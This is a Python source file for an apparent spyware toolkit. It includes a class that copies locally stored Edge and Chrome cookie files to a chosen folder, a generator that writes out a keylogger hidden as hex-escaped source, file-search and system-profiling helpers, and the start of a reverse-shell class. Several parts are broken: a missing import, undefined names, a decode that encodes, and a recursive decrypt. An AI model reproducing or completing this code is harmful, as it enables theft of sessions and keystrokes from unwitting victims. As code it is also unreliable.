import re
import platform
import requests
import shutil
import socket
import base64
import subprocess
from Crypto.Cipher import AES

class CookieMonster(object):
    '''Fetches locally stored cookies.'''
    def __init__(self):
        self.files = []
        self.lap = os.environ.get("localappdata")
        self.cookie_paths = ["{}\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Google\\Chrome\\User Data\\Default\\Cookies".format(self.lap),
                                "{}\Microsoft\\Windows\\INetCookies".format(self.lap)]

    def __len__(self):
        for paths in self.cookie_paths:
            try:
                for filename in listdir(paths):
                    self.files.append(os.path.join(paths, filename))
            except Exception as e:
                pass
        return len(files)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def show(self):
        '''Attempts to display all cookies.'''
        for paths in self.cookie_paths:
            try:
                for filename in os.listdir(paths):
                    print(os.path.join(paths, filename))
            except Exception as e:
                pass

    def save(self, path, dir_name):
        '''Save cookies to a directory using a path.'''
        cookie_jar = os.path.join(path, dir_name)
        if not os.path.exists(cookie_jar):
            os.mkdir(dirame)
            for paths in self.cookie_paths:
                try:
                    for filename in os.listdir(paths):
                        shutil.copy(os.path.join(paths, filename), cookie_jar)
                except Exception as e:
                    pass


class Ip(object):
    '''Fetches ip using http://checkip.dyndns.org.'''
    def __init__(self):
        self.url = 'http://checkip.dyndns.org'

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def get(self):
        '''Requests a page and uses regular expressions to extract the Ip
            and returns the value.'''
        request = requests.get(self.url)
        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
        return ip


class Keylogger(object):
    '''Generates a keylogger script.'''
    def __init__(self):
        self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d"
        self.code += "\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68"
        self.code += "\x6f\x6e\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72"
        self.code += "\x74\x20\x6c\x6f\x67\x67\x69\x6e\x67\x0d\x0a\x0d\x0a\x69"
        self.code += "\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0d\x0a\x0d\x0a\x0d\x0a"
        self.code += "\x0d\x0a\x0d\x0a\x0d\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x3a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"
        self.code += "\x28\x73\x65\x6c\x66\x29\x3a\x0d\x0a\x0d\x0a\x20\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x78\x74"
        self.code += "\x6c\x6f\x67\x20\x3d\x20\x6f\x73\x2e\x67\x65\x74\x63\x77"
        self.code += "\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x20"
        self.code += "\x3d\x20\x70\x79\x48\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b\x4d"
        self.code += "\x61\x6e\x61\x67\x65\x72\x28\x29\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68"
        self.code += "\x68\x6f\x6f\x6b\x2e\x4b\x65\x79\x44\x6f\x77\x6e\x20\x3d"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x67\x65\x74\x6b\x65\x79\x73\x0d"
        self.code += "\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c"
        self.code += "\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b"
        self.code += "\x4b\x65\x79\x62\x6f\x61\x72\x64\x28\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x79\x74\x68\x6f\x6e"
        self.code += "\x63\x6f\x6d\x2e\x50\x75\x6d\x70\x4d\x65\x73\x73\x61\x67"
        self.code += "\x65\x73\x28\x29\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x67\x65\x74\x6b\x65\x79\x73\x28"
        self.code += "\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29\x3a\x0d\x0a\x0d"
        self.code += "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69"
        self.code += "\x6e\x67\x2e\x62\x61\x73\x69\x63\x43\x6f\x6e\x66\x69\x67"
        self.code += "\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x73\x65\x6c\x66"
        self.code += "\x2e\x74\x65\x78\x74\x6c\x6f\x67\x2c\x20\x6c\x65\x76\x65"
        self.code += "\x6c\x3d\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x44\x45\x42\x55"
        self.code += "\x47\x2c\x20\x66\x6f\x72\x6d\x61\x74\x3d\x27\x25\x28\x6d"
        self.code += "\x65\x73\x73\x61\x67\x65\x29\x73\x27\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x63\x68\x72\x28\x6b\x65"
        self.code += "\x79\x2e\x41\x73\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69\x6e\x67"
        self.code += "\x2e\x6c\x6f\x67\x28\x31\x30\x2c\x20\x63\x68\x72\x28\x6b"
        self.code += "\x65\x79\x2e\x41\x73\x63\x69\x69\x29\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x69\x6e\x74\x20"
        self.code += "\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73\x63\x69\x69\x29"
        self.code += "\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72"
        self.code += "\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0d\x0a\x0d\x0a"
        self.code += "\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"

    def __len__(self):
        return len(self.code)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def save(self, filename):
        '''Creates a file and writes the source code.'''
        with open(filename, 'w') as source:
            source.write(self.code)
            source.close()


class Seeker(object):
    '''Loops files given path and matches a particular string.'''
    def __init__(self):
        self.count = []

    def __len__(self):
        return len(self.count)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def search_file(self, filename, path):
        '''Searches for files using a path and file name.'''
        for path, directories, files in os.walk(path):
            for Filename in files:
                if filename.lower() in Filename.lower():
                    print(os.path.join(path, Filename))
                    self.count.append(Filename)


class System(object):
    '''Attempts To Find System Hardware, Hostname, and Operating System.'''
    def __init__(self):
        self.platform = ""
        self.architecture = ""
        self.hostname = ""
        self.processor = ""
        self.cpu_count = 0

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def get(self):
        ''' Returns the platform, archiecture,
        hostname, and processor of the system.'''
        self.platform += platform.platform()
        self.architecture += platform.architecture()[0]
        self.hostname += platform.node()
        self.processor += platform.processor()
        self.cpu_count += os.cpu_count()
        return self.platform, self.architecture, self.hostname, self.processor, self.cpu_count

class Reverseshell(object):
    def __init__(self, host, port):
        self.socket = socket.socket()

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    def encode(self, data):
        return base64.b64encode(data)

    def decode(self, data):
        return base64.b64encode(data)

    def encrypt(self, data, cipher):
        return self.key.encrypt(data)

    def decrypt(self, data, cipher):
        return self.decrypt(data)
